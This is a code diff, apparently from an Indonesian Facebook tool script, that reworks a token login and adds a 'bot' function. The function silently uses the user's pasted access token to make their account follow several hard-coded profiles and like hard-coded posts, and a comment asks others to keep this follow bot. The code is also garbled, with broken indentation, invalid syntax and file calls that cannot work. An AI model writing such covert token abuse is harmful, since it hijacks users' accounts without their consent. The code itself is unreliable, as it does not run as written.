@@ -92,26 +92,35 @@ def banner():
 
 
 def login_lagi():
+		os.system('clear')
 		kontoll()
 		token = input(' [%s*%s] Masukan Token : '%(O,N))
 		if token in ['']:
-			time.sleep(2);login_lagi()
+			time.sleep(2);login().login_lagi()
 		else:
 			try:
-       cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
-				open('token.x','w').write(token)
-    except (KeyError,IOError):
-        print('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
-        os.system('rm -rf token.txt')
-        exit(premium.())
-        requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
+				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
+				open('token.x','w').write()
+				print('\n [%s+%s] Login Berhasil %s'%(H,N,cc))
+				bot()
+			except KeyError:
+				print(' [%s!%s] Token Error Coba Ganti Akun Tumbal'%(M,N))
+				print(' [%s!%s] Silahkan Masukan Kembali Perintah'%(M,N))
+				print(' [%s!%s] python Vip88.py!'%(M,N))
+				exit()	
+
+# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
+def bot():
+		try:
+			toket = open('token.x','w').read()
+		except IOError:
+			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().login_lagi()
+		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
-		requests.post('https://graph.facebook.com/711894139936601/comments/?message=' +komen+ '&access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
-		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
-		print('\n%s[%s!%s] %sLogin Berhasil'%(K,P,K,P))
-		menu().main()
+		requests.post('https://graph.facebook.com/5222521057807512/likes?summary=true&access_token=' + toket)
+		  menu().main()
 
 class menu:
 
